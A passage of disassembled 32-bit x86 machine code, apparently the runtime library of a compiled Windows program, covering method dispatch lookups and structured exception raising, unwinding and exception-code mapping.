  402994:	66 f2 af             	repnz scas %es:(%edi),%ax
  402997:	74 0a                	je     0x4029a3
  402999:	59                   	pop    %ecx
  40299a:	8b 5b ec             	mov    -0x14(%ebx),%ebx
  40299d:	85 db                	test   %ebx,%ebx
  40299f:	75 e5                	jne    0x402986
  4029a1:	5f                   	pop    %edi
  4029a2:	c3                   	ret
  4029a3:	58                   	pop    %eax
  4029a4:	01 c0                	add    %eax,%eax
  4029a6:	29 c8                	sub    %ecx,%eax
  4029a8:	8b 5c 47 fc          	mov    -0x4(%edi,%eax,2),%ebx
  4029ac:	5f                   	pop    %edi
  4029ad:	c3                   	ret
  4029ae:	8b c0                	mov    %eax,%eax
  4029b0:	39 d0                	cmp    %edx,%eax
  4029b2:	74 08                	je     0x4029bc
  4029b4:	8b 40 ec             	mov    -0x14(%eax),%eax
  4029b7:	85 c0                	test   %eax,%eax
  4029b9:	75 f5                	jne    0x4029b0
  4029bb:	c3                   	ret
  4029bc:	b0 01                	mov    $0x1,%al
  4029be:	c3                   	ret
  4029bf:	90                   	nop
  4029c0:	8b 40 d4             	mov    -0x2c(%eax),%eax
  4029c3:	c3                   	ret
  4029c4:	c3                   	ret
  4029c5:	8d 40 00             	lea    0x0(%eax),%eax
  4029c8:	53                   	push   %ebx
  4029c9:	66 8b 1a             	mov    (%edx),%bx
  4029cc:	66 09 db             	or     %bx,%bx
  4029cf:	74 17                	je     0x4029e8
  4029d1:	66 81 fb 00 c0       	cmp    $0xc000,%bx
  4029d6:	73 10                	jae    0x4029e8
  4029d8:	50                   	push   %eax
  4029d9:	8b 00                	mov    (%eax),%eax
  4029db:	e8 a4 ff ff ff       	call   0x402984
  4029e0:	58                   	pop    %eax
  4029e1:	74 05                	je     0x4029e8
  4029e3:	89 d9                	mov    %ebx,%ecx
  4029e5:	5b                   	pop    %ebx
  4029e6:	ff e1                	jmp    *%ecx
  4029e8:	5b                   	pop    %ebx
  4029e9:	8b 08                	mov    (%eax),%ecx
  4029eb:	ff 61 f0             	jmp    *-0x10(%ecx)
  4029ee:	c3                   	ret
  4029ef:	90                   	nop
  4029f0:	53                   	push   %ebx
  4029f1:	56                   	push   %esi
  4029f2:	57                   	push   %edi
  4029f3:	31 c9                	xor    %ecx,%ecx
  4029f5:	31 ff                	xor    %edi,%edi
  4029f7:	8a 1a                	mov    (%edx),%bl
  4029f9:	8b 70 dc             	mov    -0x24(%eax),%esi
  4029fc:	85 f6                	test   %esi,%esi
  4029fe:	74 15                	je     0x402a15
  402a00:	66 8b 3e             	mov    (%esi),%di
  402a03:	83 c6 02             	add    $0x2,%esi
  402a06:	8a 4e 06             	mov    0x6(%esi),%cl
  402a09:	38 d9                	cmp    %bl,%cl
  402a0b:	74 15                	je     0x402a22
  402a0d:	66 8b 0e             	mov    (%esi),%cx
  402a10:	01 ce                	add    %ecx,%esi
  402a12:	4f                   	dec    %edi
  402a13:	75 f1                	jne    0x402a06
  402a15:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a18:	85 c0                	test   %eax,%eax
  402a1a:	75 dd                	jne    0x4029f9
  402a1c:	eb 18                	jmp    0x402a36
  402a1e:	8a 1a                	mov    (%edx),%bl
  402a20:	eb eb                	jmp    0x402a0d
  402a22:	b5 00                	mov    $0x0,%ch
  402a24:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402a28:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402a2b:	80 e3 df             	and    $0xdf,%bl
  402a2e:	75 ee                	jne    0x402a1e
  402a30:	49                   	dec    %ecx
  402a31:	75 f1                	jne    0x402a24
  402a33:	8b 46 02             	mov    0x2(%esi),%eax
  402a36:	5f                   	pop    %edi
  402a37:	5e                   	pop    %esi
  402a38:	5b                   	pop    %ebx
  402a39:	c3                   	ret
  402a3a:	8b c0                	mov    %eax,%eax
  402a3c:	53                   	push   %ebx
  402a3d:	56                   	push   %esi
  402a3e:	57                   	push   %edi
  402a3f:	89 cf                	mov    %ecx,%edi
  402a41:	31 db                	xor    %ebx,%ebx
  402a43:	31 c9                	xor    %ecx,%ecx
  402a45:	8b 70 dc             	mov    -0x24(%eax),%esi
  402a48:	85 f6                	test   %esi,%esi
  402a4a:	74 13                	je     0x402a5f
  402a4c:	66 8b 0e             	mov    (%esi),%cx
  402a4f:	83 c6 02             	add    $0x2,%esi
  402a52:	3b 56 02             	cmp    0x2(%esi),%edx
  402a55:	74 13                	je     0x402a6a
  402a57:	66 8b 1e             	mov    (%esi),%bx
  402a5a:	01 de                	add    %ebx,%esi
  402a5c:	49                   	dec    %ecx
  402a5d:	75 f3                	jne    0x402a52
  402a5f:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a62:	85 c0                	test   %eax,%eax
  402a64:	75 df                	jne    0x402a45
  402a66:	88 07                	mov    %al,(%edi)
  402a68:	eb 0a                	jmp    0x402a74
  402a6a:	83 c6 06             	add    $0x6,%esi
  402a6d:	31 c9                	xor    %ecx,%ecx
  402a6f:	8a 0e                	mov    (%esi),%cl
  402a71:	41                   	inc    %ecx
  402a72:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402a74:	5f                   	pop    %edi
  402a75:	5e                   	pop    %esi
  402a76:	5b                   	pop    %ebx
  402a77:	c3                   	ret
  402a78:	53                   	push   %ebx
  402a79:	56                   	push   %esi
  402a7a:	57                   	push   %edi
  402a7b:	31 c9                	xor    %ecx,%ecx
  402a7d:	31 ff                	xor    %edi,%edi
  402a7f:	8a 1a                	mov    (%edx),%bl
  402a81:	50                   	push   %eax
  402a82:	8b 00                	mov    (%eax),%eax
  402a84:	8b 70 d8             	mov    -0x28(%eax),%esi
  402a87:	85 f6                	test   %esi,%esi
  402a89:	74 14                	je     0x402a9f
  402a8b:	66 8b 3e             	mov    (%esi),%di
  402a8e:	83 c6 06             	add    $0x6,%esi
  402a91:	8a 4e 06             	mov    0x6(%esi),%cl
  402a94:	38 d9                	cmp    %bl,%cl
  402a96:	74 18                	je     0x402ab0
  402a98:	8d 74 0e 07          	lea    0x7(%esi,%ecx,1),%esi
  402a9c:	4f                   	dec    %edi
  402a9d:	75 f2                	jne    0x402a91
  402a9f:	8b 40 ec             	mov    -0x14(%eax),%eax
  402aa2:	85 c0                	test   %eax,%eax
  402aa4:	75 de                	jne    0x402a84
  402aa6:	5a                   	pop    %edx
  402aa7:	eb 1b                	jmp    0x402ac4
  402aa9:	8a 1a                	mov    (%edx),%bl
  402aab:	8a 4e 06             	mov    0x6(%esi),%cl
  402aae:	eb e8                	jmp    0x402a98
  402ab0:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402ab4:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402ab7:	80 e3 df             	and    $0xdf,%bl
  402aba:	75 ed                	jne    0x402aa9
  402abc:	49                   	dec    %ecx
  402abd:	75 f1                	jne    0x402ab0
  402abf:	8b 06                	mov    (%esi),%eax
  402ac1:	5a                   	pop    %edx
  402ac2:	01 d0                	add    %edx,%eax
  402ac4:	5f                   	pop    %edi
  402ac5:	5e                   	pop    %esi
  402ac6:	5b                   	pop    %ebx
  402ac7:	c3                   	ret
  402ac8:	52                   	push   %edx
  402ac9:	51                   	push   %ecx
  402aca:	53                   	push   %ebx
  402acb:	ff 50 f4             	call   *-0xc(%eax)
  402ace:	31 d2                	xor    %edx,%edx
  402ad0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402ad4:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402ad7:	89 19                	mov    %ebx,(%ecx)
  402ad9:	89 69 08             	mov    %ebp,0x8(%ecx)
  402adc:	c7 41 04 ed 2a 40 00 	movl   $0x402aed,0x4(%ecx)
  402ae3:	89 41 0c             	mov    %eax,0xc(%ecx)
  402ae6:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402ae9:	5b                   	pop    %ebx
  402aea:	59                   	pop    %ecx
  402aeb:	5a                   	pop    %edx
  402aec:	c3                   	ret
  402aed:	e9 16 01 00 00       	jmp    0x402c08
  402af2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402af6:	8b 40 0c             	mov    0xc(%eax),%eax
  402af9:	e8 26 fe ff ff       	call   0x402924
  402afe:	e8 cd 03 00 00       	call   0x402ed0
  402b03:	c3                   	ret
  402b04:	8b 10                	mov    (%eax),%edx
  402b06:	ff 52 f8             	call   *-0x8(%edx)
  402b09:	c3                   	ret
  402b0a:	8b c0                	mov    %eax,%eax
  402b0c:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402b13:	76 10                	jbe    0x402b25
  402b15:	6a 00                	push   $0x0
  402b17:	6a 00                	push   $0x0
  402b19:	6a 00                	push   $0x0
  402b1b:	68 cf fa ed 0e       	push   $0xeedfacf
  402b20:	e8 97 e6 ff ff       	call   0x4011bc
  402b25:	c3                   	ret
  402b26:	8b c0                	mov    %eax,%eax
  402b28:	80 3d 00 b0 40 00 00 	cmpb   $0x0,0x40b000
  402b2f:	74 16                	je     0x402b47
  402b31:	50                   	push   %eax
  402b32:	50                   	push   %eax
  402b33:	52                   	push   %edx
  402b34:	54                   	push   %esp
  402b35:	6a 02                	push   $0x2
  402b37:	6a 00                	push   $0x0
  402b39:	68 d4 fa ed 0e       	push   $0xeedfad4
  402b3e:	e8 79 e6 ff ff       	call   0x4011bc
  402b43:	83 c4 08             	add    $0x8,%esp
  402b46:	58                   	pop    %eax
  402b47:	c3                   	ret
  402b48:	54                   	push   %esp
  402b49:	6a 01                	push   $0x1
  402b4b:	6a 00                	push   $0x0
  402b4d:	68 d0 fa ed 0e       	push   $0xeedfad0
  402b52:	e8 65 e6 ff ff       	call   0x4011bc
  402b57:	83 c4 04             	add    $0x4,%esp
  402b5a:	58                   	pop    %eax
  402b5b:	c3                   	ret
  402b5c:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402b63:	76 09                	jbe    0x402b6e
  402b65:	50                   	push   %eax
  402b66:	ff 73 04             	push   0x4(%ebx)
  402b69:	e9 da ff ff ff       	jmp    0x402b48
  402b6e:	c3                   	ret
  402b6f:	90                   	nop
  402b70:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402b77:	76 07                	jbe    0x402b80
  402b79:	50                   	push   %eax
  402b7a:	53                   	push   %ebx
  402b7b:	e9 c8 ff ff ff       	jmp    0x402b48
  402b80:	c3                   	ret
  402b81:	8d 40 00             	lea    0x0(%eax),%eax
  402b84:	85 c9                	test   %ecx,%ecx
  402b86:	74 19                	je     0x402ba1
  402b88:	8b 41 01             	mov    0x1(%ecx),%eax
  402b8b:	80 39 e9             	cmpb   $0xe9,(%ecx)
  402b8e:	74 0c                	je     0x402b9c
  402b90:	80 39 eb             	cmpb   $0xeb,(%ecx)
  402b93:	75 0c                	jne    0x402ba1
  402b95:	0f be c0             	movsbl %al,%eax
  402b98:	41                   	inc    %ecx
  402b99:	41                   	inc    %ecx
  402b9a:	eb 03                	jmp    0x402b9f
  402b9c:	83 c1 05             	add    $0x5,%ecx
  402b9f:	01 c1                	add    %eax,%ecx
  402ba1:	c3                   	ret
  402ba2:	8b c0                	mov    %eax,%eax
  402ba4:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402bab:	76 1c                	jbe    0x402bc9
  402bad:	50                   	push   %eax
  402bae:	52                   	push   %edx
  402baf:	51                   	push   %ecx
  402bb0:	e8 cf ff ff ff       	call   0x402b84
  402bb5:	51                   	push   %ecx
  402bb6:	54                   	push   %esp
  402bb7:	6a 01                	push   $0x1
  402bb9:	6a 00                	push   $0x0
  402bbb:	68 d1 fa ed 0e       	push   $0xeedfad1
  402bc0:	e8 f7 e5 ff ff       	call   0x4011bc
  402bc5:	59                   	pop    %ecx
  402bc6:	59                   	pop    %ecx
  402bc7:	5a                   	pop    %edx
  402bc8:	58                   	pop    %eax
  402bc9:	c3                   	ret
  402bca:	8b c0                	mov    %eax,%eax
  402bcc:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402bd3:	76 11                	jbe    0x402be6
  402bd5:	52                   	push   %edx
  402bd6:	54                   	push   %esp
  402bd7:	6a 01                	push   $0x1
  402bd9:	6a 00                	push   $0x0
  402bdb:	68 d2 fa ed 0e       	push   $0xeedfad2
  402be0:	e8 d7 e5 ff ff       	call   0x4011bc
  402be5:	5a                   	pop    %edx
  402be6:	c3                   	ret
  402be7:	90                   	nop
  402be8:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402bef:	76 13                	jbe    0x402c04
  402bf1:	50                   	push   %eax
  402bf2:	52                   	push   %edx
  402bf3:	54                   	push   %esp
  402bf4:	6a 02                	push   $0x2
  402bf6:	6a 00                	push   $0x0
  402bf8:	68 d3 fa ed 0e       	push   $0xeedfad3
  402bfd:	e8 ba e5 ff ff       	call   0x4011bc
  402c02:	5a                   	pop    %edx
  402c03:	58                   	pop    %eax
  402c04:	c3                   	ret
  402c05:	8d 40 00             	lea    0x0(%eax),%eax
  402c08:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c0c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402c13:	0f 85 ac 00 00 00    	jne    0x402cc5
  402c19:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402c1f:	8b 50 18             	mov    0x18(%eax),%edx
  402c22:	8b 48 14             	mov    0x14(%eax),%ecx
  402c25:	74 2f                	je     0x402c56
  402c27:	e8 30 fc ff ff       	call   0x40285c
  402c2c:	8b 15 0c c0 40 00    	mov    0x40c00c,%edx
  402c32:	85 d2                	test   %edx,%edx
  402c34:	0f 84 8b 00 00 00    	je     0x402cc5
  402c3a:	ff d2                	call   *%edx
  402c3c:	85 c0                	test   %eax,%eax
  402c3e:	0f 84 81 00 00 00    	je     0x402cc5
  402c44:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402c48:	e8 db fe ff ff       	call   0x402b28
  402c4d:	89 c2                	mov    %eax,%edx
  402c4f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c53:	8b 48 0c             	mov    0xc(%eax),%ecx
  402c56:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402c5a:	53                   	push   %ebx
  402c5b:	31 db                	xor    %ebx,%ebx
  402c5d:	56                   	push   %esi
  402c5e:	57                   	push   %edi
  402c5f:	55                   	push   %ebp
  402c60:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402c63:	53                   	push   %ebx
  402c64:	50                   	push   %eax
  402c65:	52                   	push   %edx
  402c66:	51                   	push   %ecx
  402c67:	8b 54 24 28          	mov    0x28(%esp),%edx
  402c6b:	6a 00                	push   $0x0
  402c6d:	50                   	push   %eax
  402c6e:	68 79 2c 40 00       	push   $0x402c79
  402c73:	52                   	push   %edx
  402c74:	e8 53 e5 ff ff       	call   0x4011cc
  402c79:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402c7d:	e8 d2 04 00 00       	call   0x403154
  402c82:	ff b0 00 00 00 00    	push   0x0(%eax)
  402c88:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  402c8e:	8b 6f 08             	mov    0x8(%edi),%ebp
  402c91:	8b 5f 04             	mov    0x4(%edi),%ebx
  402c94:	c7 47 04 a5 2c 40 00 	movl   $0x402ca5,0x4(%edi)
  402c9b:	83 c3 05             	add    $0x5,%ebx
  402c9e:	e8 cd fe ff ff       	call   0x402b70
  402ca3:	ff e3                	jmp    *%ebx
  402ca5:	e9 52 01 00 00       	jmp    0x402dfc
  402caa:	e8 a5 04 00 00       	call   0x403154
  402caf:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  402cb5:	8b 11                	mov    (%ecx),%edx
  402cb7:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  402cbd:	8b 41 08             	mov    0x8(%ecx),%eax
  402cc0:	e9 5f fc ff ff       	jmp    0x402924
  402cc5:	b8 01 00 00 00       	mov    $0x1,%eax
  402cca:	c3                   	ret
  402ccb:	90                   	nop
  402ccc:	8b 44 24 04          	mov    0x4(%esp),%eax
  402cd0:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402cd7:	0f 85 17 01 00 00    	jne    0x402df4
  402cdd:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402ce3:	74 1e                	je     0x402d03
  402ce5:	e8 72 fb ff ff       	call   0x40285c
  402cea:	8b 15 08 c0 40 00    	mov    0x40c008,%edx
  402cf0:	85 d2                	test   %edx,%edx
  402cf2:	0f 84 fc 00 00 00    	je     0x402df4
  402cf8:	ff d2                	call   *%edx
  402cfa:	85 c0                	test   %eax,%eax
  402cfc:	75 0a                	jne    0x402d08
  402cfe:	e9 f1 00 00 00       	jmp    0x402df4
  402d03:	8b 40 18             	mov    0x18(%eax),%eax
  402d06:	8b 00                	mov    (%eax),%eax
  402d08:	8b 54 24 08          	mov    0x8(%esp),%edx
  402d0c:	53                   	push   %ebx
  402d0d:	56                   	push   %esi
  402d0e:	57                   	push   %edi
  402d0f:	55                   	push   %ebp
  402d10:	8b 4a 04             	mov    0x4(%edx),%ecx
  402d13:	8b 59 05             	mov    0x5(%ecx),%ebx
  402d16:	8d 71 09             	lea    0x9(%ecx),%esi
  402d19:	89 c5                	mov    %eax,%ebp
  402d1b:	8b 06                	mov    (%esi),%eax
  402d1d:	85 c0                	test   %eax,%eax
  402d1f:	74 3d                	je     0x402d5e
  402d21:	89 ef                	mov    %ebp,%edi
  402d23:	39 f8                	cmp    %edi,%eax
  402d25:	74 37                	je     0x402d5e
  402d27:	8b 48 e8             	mov    -0x18(%eax),%ecx
  402d2a:	3b 4f e8             	cmp    -0x18(%edi),%ecx
  402d2d:	75 17                	jne    0x402d46
  402d2f:	8b 40 e4             	mov    -0x1c(%eax),%eax
  402d32:	8b 57 e4             	mov    -0x1c(%edi),%edx
  402d35:	31 c9                	xor    %ecx,%ecx
  402d37:	8a 08                	mov    (%eax),%cl
  402d39:	3a 0a                	cmp    (%edx),%cl
  402d3b:	75 09                	jne    0x402d46
  402d3d:	40                   	inc    %eax
  402d3e:	42                   	inc    %edx
  402d3f:	e8 c8 f9 ff ff       	call   0x40270c
  402d44:	74 18                	je     0x402d5e
  402d46:	8b 7f ec             	mov    -0x14(%edi),%edi
  402d49:	8b 06                	mov    (%esi),%eax
  402d4b:	85 ff                	test   %edi,%edi
  402d4d:	75 d4                	jne    0x402d23
  402d4f:	83 c6 08             	add    $0x8,%esi
  402d52:	4b                   	dec    %ebx
  402d53:	75 c6                	jne    0x402d1b
  402d55:	5d                   	pop    %ebp
  402d56:	5f                   	pop    %edi
  402d57:	5e                   	pop    %esi
  402d58:	5b                   	pop    %ebx
  402d59:	e9 96 00 00 00       	jmp    0x402df4
  402d5e:	8b 44 24 14          	mov    0x14(%esp),%eax
  402d62:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402d68:	8b 50 18             	mov    0x18(%eax),%edx
  402d6b:	8b 48 14             	mov    0x14(%eax),%ecx
  402d6e:	74 18                	je     0x402d88
  402d70:	ff 15 0c c0 40 00    	call   *0x40c00c
  402d76:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402d7a:	e8 a9 fd ff ff       	call   0x402b28
  402d7f:	89 c2                	mov    %eax,%edx
  402d81:	8b 44 24 14          	mov    0x14(%esp),%eax
  402d85:	8b 48 0c             	mov    0xc(%eax),%ecx
  402d88:	31 db                	xor    %ebx,%ebx
  402d8a:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402d8d:	53                   	push   %ebx
  402d8e:	50                   	push   %eax
  402d8f:	52                   	push   %edx
  402d90:	51                   	push   %ecx
  402d91:	8b 54 24 28          	mov    0x28(%esp),%edx
  402d95:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402d99:	56                   	push   %esi
  402d9a:	6a 00                	push   $0x0
  402d9c:	50                   	push   %eax
  402d9d:	68 a8 2d 40 00       	push   $0x402da8
  402da2:	52                   	push   %edx
  402da3:	e8 24 e4 ff ff       	call   0x4011cc
  402da8:	5b                   	pop    %ebx
  402da9:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402dad:	e8 a2 03 00 00       	call   0x403154
  402db2:	ff b0 00 00 00 00    	push   0x0(%eax)
  402db8:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  402dbe:	8b 6f 08             	mov    0x8(%edi),%ebp
  402dc1:	c7 47 04 d4 2d 40 00 	movl   $0x402dd4,0x4(%edi)
  402dc8:	8b 44 24 08          	mov    0x8(%esp),%eax
  402dcc:	e8 8b fd ff ff       	call   0x402b5c
  402dd1:	ff 63 04             	jmp    *0x4(%ebx)
  402dd4:	e9 23 00 00 00       	jmp    0x402dfc
  402dd9:	e8 76 03 00 00       	call   0x403154
  402dde:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  402de4:	8b 11                	mov    (%ecx),%edx
  402de6:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  402dec:	8b 41 08             	mov    0x8(%ecx),%eax
  402def:	e9 30 fb ff ff       	jmp    0x402924
  402df4:	b8 01 00 00 00       	mov    $0x1,%eax
  402df9:	c3                   	ret
  402dfa:	8b c0                	mov    %eax,%eax
  402dfc:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e00:	8b 54 24 08          	mov    0x8(%esp),%edx
  402e04:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402e0b:	74 1f                	je     0x402e2c
  402e0d:	8b 4a 04             	mov    0x4(%edx),%ecx
  402e10:	c7 42 04 2c 2e 40 00 	movl   $0x402e2c,0x4(%edx)
  402e17:	53                   	push   %ebx
  402e18:	56                   	push   %esi
  402e19:	57                   	push   %edi
  402e1a:	55                   	push   %ebp
  402e1b:	8b 6a 08             	mov    0x8(%edx),%ebp
  402e1e:	83 c1 05             	add    $0x5,%ecx
  402e21:	e8 7e fd ff ff       	call   0x402ba4
  402e26:	ff d1                	call   *%ecx
  402e28:	5d                   	pop    %ebp
  402e29:	5f                   	pop    %edi
  402e2a:	5e                   	pop    %esi
  402e2b:	5b                   	pop    %ebx
  402e2c:	b8 01 00 00 00       	mov    $0x1,%eax
  402e31:	c3                   	ret
  402e32:	8b c0                	mov    %eax,%eax
  402e34:	55                   	push   %ebp
  402e35:	31 ed                	xor    %ebp,%ebp
  402e37:	68 64 2e 40 00       	push   $0x402e64
  402e3c:	64 ff 75 00          	push   %fs:0x0(%ebp)
  402e40:	64 89 65 00          	mov    %esp,%fs:0x0(%ebp)
  402e44:	85 f6                	test   %esi,%esi
  402e46:	74 0e                	je     0x402e56
  402e48:	78 0a                	js     0x402e54
  402e4a:	4e                   	dec    %esi
  402e4b:	8b 2c b7             	mov    (%edi,%esi,4),%ebp
  402e4e:	4e                   	dec    %esi
  402e4f:	55                   	push   %ebp
  402e50:	79 f9                	jns    0x402e4b
  402e52:	eb 02                	jmp    0x402e56
  402e54:	db 2f                	fldt   (%edi)
  402e56:	ff d3                	call   *%ebx
  402e58:	31 d2                	xor    %edx,%edx
  402e5a:	31 c9                	xor    %ecx,%ecx
  402e5c:	eb 47                	jmp    0x402ea5
  402e5e:	b8 01 00 00 00       	mov    $0x1,%eax
  402e63:	c3                   	ret
  402e64:	e8 f3 f9 ff ff       	call   0x40285c
  402e69:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e6d:	8b 54 24 08          	mov    0x8(%esp),%edx
  402e71:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402e78:	75 e4                	jne    0x402e5e
  402e7a:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402e7e:	6a 00                	push   $0x0
  402e80:	50                   	push   %eax
  402e81:	68 8c 2e 40 00       	push   $0x402e8c
  402e86:	52                   	push   %edx
  402e87:	e8 40 e3 ff ff       	call   0x4011cc
  402e8c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e90:	8b 08                	mov    (%eax),%ecx
  402e92:	8b 50 18             	mov    0x18(%eax),%edx
  402e95:	81 f9 ce fa ed 0e    	cmp    $0xeedface,%ecx
  402e9b:	75 05                	jne    0x402ea2
  402e9d:	8b 40 14             	mov    0x14(%eax),%eax
  402ea0:	eb 03                	jmp    0x402ea5
  402ea2:	8b 40 0c             	mov    0xc(%eax),%eax
  402ea5:	31 ed                	xor    %ebp,%ebp
  402ea7:	64 8b 65 00          	mov    %fs:0x0(%ebp),%esp
  402eab:	64 8f 45 00          	pop    %fs:0x0(%ebp)
  402eaf:	5d                   	pop    %ebp
  402eb0:	c3                   	ret
  402eb1:	8d 40 00             	lea    0x0(%eax),%eax
  402eb4:	5a                   	pop    %edx
  402eb5:	54                   	push   %esp
  402eb6:	55                   	push   %ebp
  402eb7:	57                   	push   %edi
  402eb8:	56                   	push   %esi
  402eb9:	53                   	push   %ebx
  402eba:	50                   	push   %eax
  402ebb:	52                   	push   %edx
  402ebc:	54                   	push   %esp
  402ebd:	6a 07                	push   $0x7
  402ebf:	6a 01                	push   $0x1
  402ec1:	68 ce fa ed 0e       	push   $0xeedface
  402ec6:	52                   	push   %edx
  402ec7:	e9 f0 e2 ff ff       	jmp    0x4011bc
  402ecc:	c3                   	ret
  402ecd:	8d 40 00             	lea    0x0(%eax),%eax
  402ed0:	8b 44 24 30          	mov    0x30(%esp),%eax
  402ed4:	c7 40 04 1b 2f 40 00 	movl   $0x402f1b,0x4(%eax)
  402edb:	e8 74 02 00 00       	call   0x403154
  402ee0:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402ee6:	8b 0a                	mov    (%edx),%ecx
  402ee8:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402eee:	8b 42 0c             	mov    0xc(%edx),%eax
  402ef1:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  402ef5:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402efb:	74 0d                	je     0x402f0a
  402efd:	8b 42 08             	mov    0x8(%edx),%eax
  402f00:	e8 1f fa ff ff       	call   0x402924
  402f05:	e8 02 fc ff ff       	call   0x402b0c
  402f0a:	31 c0                	xor    %eax,%eax
  402f0c:	83 c4 14             	add    $0x14,%esp
  402f0f:	64 8b 10             	mov    %fs:(%eax),%edx
  402f12:	59                   	pop    %ecx
  402f13:	8b 12                	mov    (%edx),%edx
  402f15:	89 11                	mov    %edx,(%ecx)
  402f17:	5d                   	pop    %ebp
  402f18:	5f                   	pop    %edi
  402f19:	5e                   	pop    %esi
  402f1a:	5b                   	pop    %ebx
  402f1b:	b8 01 00 00 00       	mov    $0x1,%eax
  402f20:	c3                   	ret
  402f21:	8d 40 00             	lea    0x0(%eax),%eax
  402f24:	e8 2b 02 00 00       	call   0x403154
  402f29:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402f2f:	8b 0a                	mov    (%edx),%ecx
  402f31:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402f37:	8b 42 08             	mov    0x8(%edx),%eax
  402f3a:	e8 e5 f9 ff ff       	call   0x402924
  402f3f:	5a                   	pop    %edx
  402f40:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  402f44:	31 c0                	xor    %eax,%eax
  402f46:	59                   	pop    %ecx
  402f47:	64 89 08             	mov    %ecx,%fs:(%eax)
  402f4a:	58                   	pop    %eax
  402f4b:	5d                   	pop    %ebp
  402f4c:	e8 7b fc ff ff       	call   0x402bcc
  402f51:	ff e2                	jmp    *%edx
  402f53:	c3                   	ret
  402f54:	31 d2                	xor    %edx,%edx
  402f56:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402f5a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402f5e:	83 c1 05             	add    $0x5,%ecx
  402f61:	64 89 02             	mov    %eax,%fs:(%edx)
  402f64:	ff d1                	call   *%ecx
  402f66:	c2 0c 00             	ret    $0xc
  402f69:	c3                   	ret
  402f6a:	8b c0                	mov    %eax,%eax
  402f6c:	89 14 24             	mov    %edx,(%esp)
  402f6f:	e9 cd 0e 00 00       	jmp    0x403e41
  402f74:	c3                   	ret
  402f75:	8d 40 00             	lea    0x0(%eax),%eax
  402f78:	55                   	push   %ebp
  402f79:	8b ec                	mov    %esp,%ebp
  402f7b:	8b 55 08             	mov    0x8(%ebp),%edx
  402f7e:	8b 02                	mov    (%edx),%eax
  402f80:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  402f85:	7f 2c                	jg     0x402fb3
  402f87:	74 5c                	je     0x402fe5
  402f89:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  402f8e:	7f 15                	jg     0x402fa5
  402f90:	74 57                	je     0x402fe9
  402f92:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  402f97:	74 5c                	je     0x402ff5
  402f99:	2d 87 00 00 00       	sub    $0x87,%eax
  402f9e:	74 3d                	je     0x402fdd
  402fa0:	48                   	dec    %eax
  402fa1:	74 4e                	je     0x402ff1
  402fa3:	eb 60                	jmp    0x403005
  402fa5:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  402faa:	83 e8 02             	sub    $0x2,%eax
  402fad:	72 36                	jb     0x402fe5
  402faf:	74 30                	je     0x402fe1
  402fb1:	eb 52                	jmp    0x403005
  402fb3:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402fb8:	7f 11                	jg     0x402fcb
  402fba:	74 3d                	je     0x402ff9
  402fbc:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  402fc1:	74 2e                	je     0x402ff1
  402fc3:	48                   	dec    %eax
  402fc4:	74 13                	je     0x402fd9
  402fc6:	48                   	dec    %eax
  402fc7:	74 24                	je     0x402fed
  402fc9:	eb 3a                	jmp    0x403005
  402fcb:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  402fd0:	74 2f                	je     0x403001
  402fd2:	83 e8 3d             	sub    $0x3d,%eax
